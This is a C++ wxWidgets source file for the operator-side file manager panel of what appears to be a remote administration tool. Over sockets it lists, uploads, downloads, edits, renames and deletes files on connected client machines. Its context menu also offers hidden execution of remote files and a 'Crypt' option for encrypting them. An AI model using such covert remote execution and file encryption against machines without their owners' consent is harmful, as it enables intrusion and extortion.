#include "panel_file_manager.hpp"
#include "frame_client.hpp"
#include "file_editor.hpp"
#include "file_encryption.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(panelFileManager, wxPanel)
	EVT_MENU(wxID_ANY, panelFileManager::OnToolBarClick)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(ListCtrlManager, wxListCtrl)
	EVT_MENU(EnumMenuFM::ID_New_Folder, ListCtrlManager::OnCrearFolder)
	EVT_MENU(EnumMenuFM::ID_New_Archivo, ListCtrlManager::OnCrearArchivo)
	EVT_MENU(EnumMenuFM::ID_Eliminar, ListCtrlManager::OnBorrarArchivo)
	EVT_MENU(EnumMenuFM::ID_Editar, ListCtrlManager::OnEditarArchivo)
	EVT_MENU(EnumMenuFM::ID_Exec_Visible, ListCtrlManager::OnEjecutarArchivo_Visible)
	EVT_MENU(EnumMenuFM::ID_Exec_Oculto, ListCtrlManager::OnEjecutarArchivo_Oculto)
	EVT_MENU(EnumMenuFM::ID_Descargar, ListCtrlManager::OnDescargarArchivo)
	EVT_MENU(EnumMenuFM::ID_Renombrar, ListCtrlManager::OnRenombrarArchivo)
	EVT_MENU(EnumMenuFM::ID_Crypt, ListCtrlManager::OnEncriptarArchivo)
	EVT_CONTEXT_MENU(ListCtrlManager::OnContextMenu)
	EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Panel_FM_List, ListCtrlManager::OnActivated)
wxEND_EVENT_TABLE()

panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _strID, std::string _strIP) :
	wxPanel(pParent, EnumIDS::ID_Panel_FM) {
	this->SetBackgroundColour(wxColor(200, 200, 200));
	
	this->sckCliente = sck;
	this->strID = _strID;
	this->strIP = _strIP;
	
	this->p_ToolBar = new wxToolBar(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxTB_VERTICAL | wxTB_LEFT);
	
	wxBitmap pcBitmap(wxT(".\\imgs\\computer.png"), wxBITMAP_TYPE_PNG);       //https://www.flaticon.com/authors/nikita-golubev
	wxBitmap desktopBitmap(wxT(".\\imgs\\desktop.png"), wxBITMAP_TYPE_PNG);   //https://www.flaticon.com/authors/xnimrodx
	wxBitmap downloadBitmap(wxT(".\\imgs\\download.png"), wxBITMAP_TYPE_PNG); //https://www.flaticon.com/authors/bharat-icons
	wxBitmap refreshBitmap(wxT(".\\imgs\\refresh.png"), wxBITMAP_TYPE_PNG);   //https://www.flaticon.com/authors/arkinasi
	wxBitmap uploadBitmap(wxT(".\\imgs\\upload.png"), wxBITMAP_TYPE_PNG);     //https://www.flaticon.com/authors/ilham-fitrotul-hayat
	

	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Equipo, wxT("Equipo"), pcBitmap, "Equipo");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Escritorio, wxT("Escritorio"), desktopBitmap, "Escritorio");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Descargas, wxT("Descargas"), downloadBitmap, "Descargas");
	this->p_ToolBar->AddSeparator(); 
	this->p_ToolBar->AddSeparator(); 
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Refrescar"), refreshBitmap, wxT("Refrescar"));
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Subir, wxT("Subir"), uploadBitmap, "Subir archivo a ruta actual");
	this->p_ToolBar->Realize();

	this->CrearLista();

	this->p_RutaActual = new wxStaticText(this, EnumIDS::ID_Panel_FM_LblRuta, wxT("\\"), wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 10));

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	sizer->Add(this->p_ToolBar, 0, wxEXPAND | wxALL);
	
	wxBoxSizer* sizer2 = new wxBoxSizer(wxVERTICAL);
	sizer2->Add(this->listManager, 1, wxEXPAND | wxALL, 1);
	sizer2->Add(this->p_RutaActual, 0, wxEXPAND | wxALL, 1);

	sizer->Add(sizer2);
	SetSizer(sizer);

}

void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
	wxListItem itemCol;
	std::string strComando = "";
	switch (event.GetId()) {
		case EnumIDS::ID_Panel_FM_Equipo:
			//ENVIAR COMANDO OBTENER DRIVES
			this->listManager->DeleteAllItems();
			this->iMODE = FM_EQUIPO;
			strComando = DUMMY_PARAM;
			
			this->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Discos);
			break;
		case EnumIDS::ID_Panel_FM_Descargas:
			//ENVIAR COMANDO OBTENER FOLDER DESCARGAS
			this->listManager->DeleteAllItems();
			this->iMODE = FM_NORMAL;
			strComando = "DESCAR-DOWN";

			this->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Escritorio:
			//ENVIAR COMANDO OBTENER FOLDER DE ESCRITORIO
			this->listManager->DeleteAllItems();
			this->iMODE = FM_NORMAL;
			strComando = "ESCRI-DESK";

			this->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Refresh:
			this->listManager->DeleteAllItems();
			strComando = this->p_RutaActual->GetLabelText();
			
			this->Enable(false);
			this->listManager->MostrarCarga();
			
			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Subir:
			wxFileDialog dialog(this, "Seleccionar archivo a enviar", wxEmptyString, wxEmptyString, wxFileSelectorDefaultWildcardStr, wxFD_OPEN | wxFD_FILE_MUST_EXIST);
			if (dialog.ShowModal() == wxID_OK) {
				//dialog.GetPath() ruta al archivo seleccionado
				std::string strTID = this->strID;
				std::string strRutaLocal = dialog.GetPath();
				std::string strRutaRemota = this->p_RutaActual->GetLabelText();
				strRutaRemota += dialog.GetFilename();
				//std::thread thEnviar(&panelFileManager::EnviarArchivo, this, dialog.GetPath(), strRutaRemota.c_str(), iTempID);
				std::thread thEnviar([this, strRutaLocal, strRutaRemota, strTID] {
					this->EnviarArchivo(strRutaLocal, strRutaRemota.c_str(), strTID);
				});
				thEnviar.detach();
			}
			break;
	}
}

void panelFileManager::CrearLista() {
	this->listManager = new ListCtrlManager(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition,  wxDefaultSize/*wxSize(FRAME_CLIENT_SIZE_WIDTH*3, FRAME_CLIENT_SIZE_WIDTH*3)*/, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES, this->strID, this->strIP, this->sckCliente);
	this->listManager->m_indicator = new wxActivityIndicator(this->listManager, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	this->listManager->m_indicator->Show(false);
}

void panelFileManager::EnviarComando(std::string pComando, int iComando) {
	p_Servidor->cChunkSend(this->sckCliente, pComando.c_str(), pComando.size(), 0, false, iComando);
}

void panelFileManager::EnviarArchivo(const std::string lPath, const char* rPath, std::string strCliente) {
	DEBUG_MSG("Enviado " + lPath);

	std::ifstream localFile(lPath, std::ios::binary);
	if (!localFile.is_open()) {
		ERROR_EW("No se pudo abrir el archivo " + lPath);
		return;
	}

	u64 uTamArchivo = GetFileSize(lPath.c_str());
	u64 uBytesEnviados = 0;

	//////     AGREGAR TRANSFER AL VECTOR DEL SERVIDOR       /////////////
	// Solo para monitorear transferencia
	TransferStatus nuevo_transfer;
	Archivo_Descarga nuevo_archivo; //NULL
	nuevo_transfer.isUpload = true;
	nuevo_transfer.uTamano = uTamArchivo;
	nuevo_transfer.strNombre = lPath;
	nuevo_transfer.uDescargado = 0;
	
	int iClienteID = p_Servidor->IndexOf(strCliente);
	if (iClienteID == -1) {
		DEBUG_MSG("[X] No se pudo encontrar el cliente " + strCliente);
		return;
	}
	
	std::string strID = RandomID(4);

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Insertar(strID, nuevo_archivo, nuevo_transfer);
	///////////////////////////////////////////////////////////////////////

	std::string strComando = rPath;
	strComando.append(1, CMD_DEL);
	strComando += std::to_string(uTamArchivo);
	strComando.append(1, CMD_DEL);
	strComando += strID;
	
	//Enviar ruta remota y tamaño de archivo
	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, true, EnumComandos::FM_Descargar_Archivo_Init);
	
	int iBytesLeidos = 0;

	std::string strHeader = strID;
	strHeader.append(1, CMD_DEL);

	int iHeaderSize = strHeader.size();

	std::vector<char> nSendBuffer(PAQUETE_BUFFER_SIZE + iHeaderSize);
	if (nSendBuffer.size() == 0) {
		DEBUG_MSG("[0]No se pudo reservar memoria para enviar el archivo.");
		return;
	}

	memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);

	while (1) {
		localFile.read(nSendBuffer.data() + iHeaderSize, PAQUETE_BUFFER_SIZE);
		iBytesLeidos = localFile.gcount();
		if (iBytesLeidos > 0) {
			iBytesLeidos += iHeaderSize;
			int iEnviado = p_Servidor->cChunkSend(this->sckCliente, nSendBuffer.data(), iBytesLeidos, 0, false, EnumComandos::FM_Descargar_Archivo_Recibir);
			uBytesEnviados += iEnviado;
			if (iEnviado == SOCKET_ERROR || iEnviado == WSAECONNRESET) {
				break;
			}
			p_Servidor->vc_Clientes[iClienteID]->Transfers_IncreSize(strID, iEnviado);
		}else {
			break;
		}
	}
	
	localFile.close();

	int index = p_Servidor->vc_Clientes[iClienteID]->Transfers_Exists(strID);
	if (index != -1) {
		TransferStatus temp_tranfers = p_Servidor->vc_Clientes[iClienteID]->Transfer_Get(index);
		u64 udiff = temp_tranfers.uTamano - temp_tranfers.uDescargado;
		if (udiff > 0) {
			DEBUG_MSG("Error en transferencia");
			p_Servidor->vc_Clientes[iClienteID]->Transfers_IncreSize(strID, udiff);
		}
	}

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Fin(strID);

	//Ya se envio todo, cerrar el archivo
	std::this_thread::sleep_for(std::chrono::milliseconds(500));
	p_Servidor->cChunkSend(this->sckCliente, strID.c_str(), strID.size(), 0, true, EnumComandos::FM_Descargar_Archivo_End);
}

void panelFileManager::ActualizarRuta(const char*& pBuffer) {
	if (this->p_RutaActual) {
		this->p_RutaActual->SetLabel(wxString(pBuffer));
		this->c_RutaActual.clear();

		std::vector<std::string> vcNuevaRuta = strSplit(std::string(pBuffer), CMD_DEL, 100);
		for (std::string& sub_path : vcNuevaRuta) {
			if (sub_path == "\\") { continue; }
			sub_path += "\\";
			this->c_RutaActual.push_back(sub_path);
		}
	}
}

wxString panelFileManager::RutaActual() {
	wxString strOut = "";
	for (auto item : this->c_RutaActual) {
		strOut += item;
	}
	return strOut;
}

//#####################################################
//#####################################################
//        Acciones menu contextual
void ListCtrlManager::OnCrearFolder(wxCommandEvent& event) {
	wxTextEntryDialog dialog(this, "Nombre", "Crear folder/carpeta", "Nueva Carpeta", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK){
		std::string strComando = this->CarpetaActual();
		strComando += dialog.GetValue();
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Crear_Folder);
	}
}

void ListCtrlManager::OnCrearArchivo(wxCommandEvent& event) {
	wxTextEntryDialog dialog(this, "Nombre", "Crear archivo", "LEEME.txt", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK) {
		std::string strComando = this->CarpetaActual();
		strComando += dialog.GetValue();
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Crear_Archivo);
	}
}

void ListCtrlManager::OnBorrarArchivo(wxCommandEvent& event) {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	wxString strFile = this->GetItemText(item, 1);
	//wxDialog dialog(this, 10000, "Borrar arhivo", wxDefaultPosition, wxDefaultSize, wxYES_NO, "Seguro que quieres borrar el archivo: " + strFile);
	wxMessageDialog dialog(this, "Seguro que quieres borrar el archivo: " + strFile + "?", "Borrar archivo", wxCENTER | wxNO_DEFAULT | wxYES_NO | wxICON_QUESTION);
	if (dialog.ShowModal() == wxID_YES) {
		//Borrar archivo
		std::string strComando = this->CarpetaActual();
		strComando += strFile;
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Borrar_Archivo);
	}
}

void ListCtrlManager::OnDescargarArchivo(wxCommandEvent& event) {
	std::string strID = RandomID(3);
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando += strID;

	//Agregar el archivo al vector del cliente pero solo el id
	//actualizar el tamaño al obtener la info del cliente
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strNombre = this->strID;
	strNombre.append(1, '-');
	strNombre += this->GetItemText(item, 1);
	
	wxFileDialog dialog(this, "Guardar archivo", wxEmptyString, strNombre, wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

	if (dialog.ShowModal() != wxID_OK) {
		return;
	}

	struct TransferStatus nuevo_transfer;
	struct Archivo_Descarga nuevo_archivo;
	nuevo_archivo.ssOutFile = std::make_shared <std::ofstream>(dialog.GetPath().ToStdString(), std::ios::binary);
	nuevo_transfer.uDescargado = nuevo_transfer.uTamano = nuevo_archivo.uTamarchivo = nuevo_archivo.uDescargado = 0;
	nuevo_transfer.strNombre = nuevo_archivo.strNombre = this->GetItemText(item, 1);
	nuevo_transfer.isUpload = false;
	if(!nuevo_archivo.ssOutFile.get()->is_open()) {
		DEBUG_MSG("[X] No se pudo abrir el archivo " + strNombre);
		return;
	}

	int iClienteID = p_Servidor->IndexOf(this->strID);
	if (iClienteID == -1) {
		DEBUG_MSG("[X] No se pudo encontrar el cliente " + this->strID);
		return;
	}

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Insertar(strID, nuevo_archivo, nuevo_transfer);

	this->itemp->EnviarComando(strComando, EnumComandos::FM_Descargar_Archivo);
}

void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando.append(1, EXEC_VISIBLE);
	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
}

void ListCtrlManager::OnEjecutarArchivo_Oculto(wxCommandEvent& event) {
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando.append(1, EXEC_OCULTO);
	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
}

void ListCtrlManager::OnEditarArchivo(wxCommandEvent& event) {
	wxString strFile = this->ArchivoSeleccionado();
	wxEditForm* editor_txt = new wxEditForm(this, strFile, RandomID(4));
	editor_txt->Show(true);
}

void ListCtrlManager::OnRenombrarArchivo(wxCommandEvent& event) {
	//Obtener nombre del 
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	wxString strFile = this->GetItemText(item, 1);

	wxTextEntryDialog dialog(this, "Nuevo Nombre", "Cambiar Nombre", strFile, wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK) {
		std::string strComando = strFile;    //Nombre antiguo
		strComando.append(1, CMD_DEL);
		strComando += dialog.GetValue();     //Nuevo nombre
		strComando.append(1, CMD_DEL);
		strComando += this->CarpetaActual(); //Ruta actual
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Renombrar_Archivo);
	}
}

void ListCtrlManager::OnEncriptarArchivo(wxCommandEvent& event) {
	frameEncryption* frm_crypt = new frameEncryption(this, this->ArchivoSeleccionado(), this->strID, this->strIP, this->sckCliente);
	frm_crypt->Show(true);
}

//#####################################################

std::string ListCtrlManager::ArchivoSeleccionado() {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strFile = this->CarpetaActual();
	strFile += this->GetItemText(item, 1);
	return strFile;
}

std::string ListCtrlManager::CarpetaActual() {
	std::string strCarpeta = this->itemp->p_RutaActual->GetLabelText();
	return strCarpeta;
}

void ListCtrlManager::OnActivated(wxListEvent& event) {
	panelFileManager* itemp = (panelFileManager*)this->GetParent();
	wxString strPath = "";
	wxString strSelected = "";
	wxListItem itemCol;
	std::string strCommand = "";
	switch (itemp->iMODE) {
		case FM_EQUIPO:
			itemp->c_RutaActual.clear();

			strPath = this->GetItemText(event.GetIndex(), 0) + ":\\";
			itemp->p_RutaActual->SetLabelText(strPath);
			itemp->c_RutaActual.push_back(strPath);
			strCommand = strPath;

			this->ClearAll();
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetWidth(150);
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			this->InsertColumn(1, itemCol);

			itemCol.SetText("Tamaño");
			itemCol.SetWidth(80);
			this->InsertColumn(2, itemCol);

			itemCol.SetText("Fecha Mod");
			itemCol.SetWidth(100);
			this->InsertColumn(3, itemCol);
			
			itemp->Enable(false);
			
			this->MostrarCarga();
			
			itemp->EnviarComando(strCommand, EnumComandos::FM_Dir_Folder);
			itemp->iMODE = FM_NORMAL;
			break;
		case FM_NORMAL:
			if (this->GetItemText(event.GetIndex(), 2) == wxString("-")) {
				//Folder
				strSelected = this->GetItemText(event.GetIndex(), 1) + "\\";
				if (strSelected != ".\\") {
					if (strSelected == "..\\") {
						itemp->c_RutaActual.pop_back();
					}
					else {
						itemp->c_RutaActual.push_back(strSelected);
					}

					itemp->p_RutaActual->SetLabelText(itemp->RutaActual());

					this->DeleteAllItems();

					strCommand = itemp->RutaActual();

					itemp->Enable(false); 
					
					this->MostrarCarga();

					itemp->EnviarComando(strCommand, EnumComandos::FM_Dir_Folder);
					
				}
			}
			break;
		default:
			break;
	}
}

void ListCtrlManager::ShowContextMenu(const wxPoint& pos, bool isFolder) {
	wxMenu menu;

	this->itemp = (panelFileManager*)this->GetParent();
	if (!isFolder) {
		wxMenu *exec_Menu = new wxMenu;
		exec_Menu->Append(EnumMenuFM::ID_Exec_Visible, "Normal");
		exec_Menu->Append(EnumMenuFM::ID_Exec_Oculto, "Oculto");

		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		menu.AppendSubMenu(exec_Menu, "Ejecutar");
		menu.Append(EnumMenuFM::ID_Descargar, "Descargar");
		menu.Append(EnumMenuFM::ID_Editar, "Editar");
		menu.Append(EnumMenuFM::ID_Renombrar, "Renombrar");
		menu.AppendSeparator();
		menu.Append(EnumMenuFM::ID_Crypt, "Crypt");
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	} else {
		//pop menu para folder
		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		if (this->GetSelectedItemCount() > 0) {
			menu.Append(EnumMenuFM::ID_Renombrar, "Renombrar");
		}
		menu.AppendSeparator();
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	}
}

void ListCtrlManager::OnContextMenu(wxContextMenuEvent& event)
{
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		if (iItem == -1) {
			ShowContextMenu(point, true);
			return;
		}

		ShowContextMenu(point, (this->GetItemText(iItem, 2) == "-") ? true : false);

	}else {
		event.Skip();
	}
}

//void ListCtrlManager::ListarDir(const std::vector<std::string> vcEntrys, const wxString strSize) {
void ListCtrlManager::ListarDir(const char* strData) {
	//Listar directorio
	//4 columnas para listar dir
	std::unique_lock<std::mutex> lock(this->mtx_fm);

	if (this->GetColumnCount() != 4) {
		wxListItem itemCol;
		this->ClearAll();
		itemCol.SetText("-");
		itemCol.SetWidth(20);
		itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
		this->InsertColumn(0, itemCol);

		itemCol.SetText("Nombre");
		itemCol.SetWidth(150);
		itemCol.SetAlign(wxLIST_FORMAT_LEFT);
		this->InsertColumn(1, itemCol);

		itemCol.SetText("Tamaño");
		itemCol.SetWidth(80);
		this->InsertColumn(2, itemCol);

		itemCol.SetText("Fecha Mod");
		itemCol.SetWidth(100);
		this->InsertColumn(3, itemCol);
	}

	for (std::string vcEntry : strSplit(std::string(strData), '|', 10000)) {
		std::vector<std::string> vcFileEntry;
		wxString strTama = "-";
		if (vcEntry[1] == '>') {
			//Dir
			vcFileEntry = strSplit(vcEntry, '>', 4);
		}else if (vcEntry[1] == '<') {
			//file
			vcFileEntry = strSplit(vcEntry, '<', 4);
			if (vcFileEntry.size() == 4) {
				u64 bytes = StrToUint(vcFileEntry[2].c_str());
				const char* cDEN = "BKMGTP";
				double factor = floor((vcFileEntry[2].size() - 1) / 3);
				char cBuf[20];
				snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
				strTama = cBuf;
			}
		}else {
			//unknown
			DEBUG_MSG("[FM]DESCONOCIDO: " + vcEntry);
		}
		
		if (vcFileEntry.size() == 4) {
			int iCount = this->GetItemCount() > 0 ? this->GetItemCount() - 1 : 0;
			if (iCount == -1) { iCount = 0; }
			this->InsertItem(iCount, wxString("-"));
			this->SetItem(iCount, 1, wxString(vcFileEntry[1]));
			this->SetItem(iCount, 2, strTama); //tama
			this->SetItem(iCount, 3, wxString(vcFileEntry[3]));
		}else {
			DEBUG_MSG("La entrada no tiene los parametros requeridos: " + vcEntry);
		}

	}
	this->GetParent()->Enable(true);
	this->OcultarCarga();
}

void ListCtrlManager::ListarEquipo(const std::vector<std::string> vcDrives) {
	//Listar discos y almacenamiento
	//5 Columnas para drives
	std::unique_lock<std::mutex> lock(this->mtx_fm);
	if (this->GetColumnCount() != 5) {
		wxListItem itemCol;
		this->ClearAll();

		itemCol.SetText("-");
		itemCol.SetWidth(20);
		itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
		this->InsertColumn(0, itemCol);

		itemCol.SetText("Nombre");
		itemCol.SetAlign(wxLIST_FORMAT_LEFT);
		itemCol.SetWidth(150);
		this->InsertColumn(1, itemCol);

		itemCol.SetText("Tipo");
		itemCol.SetWidth(100);
		this->InsertColumn(2, itemCol);

		itemCol.SetText("Libre");
		itemCol.SetWidth(50);
		this->InsertColumn(3, itemCol);

		itemCol.SetText("Total");
		itemCol.SetWidth(50);
		this->InsertColumn(4, itemCol);
	}

	for (int iCount = 0, iRowCount = 0; iCount<int(vcDrives.size()); iCount++) {
		std::vector<std::string> vDrive = strSplit(vcDrives[iCount], '|', 5);
		if (vDrive.size() >= 5) {
			this->InsertItem(iRowCount, wxString(vDrive[0]));
			this->SetItem(iRowCount, 1, wxString(vDrive[2]));
			this->SetItem(iRowCount, 2, wxString(vDrive[1]));
			this->SetItem(iRowCount, 3, wxString(vDrive[3]));
			this->SetItem(iRowCount, 4, wxString(vDrive[4]));
			iRowCount++;
		}
	}

	this->GetParent()->Enable(true);
	this->OcultarCarga();
}

void ListCtrlManager::MostrarCarga() {
	std::unique_lock<std::mutex> lock(this->mtx_carga);
	this->m_indicator->Show(true);
	this->m_indicator->Start();
}

void ListCtrlManager::OcultarCarga() {
	std::unique_lock<std::mutex> lock(this->mtx_carga);
	this->m_indicator->Stop();
	this->m_indicator->Show(false);
}
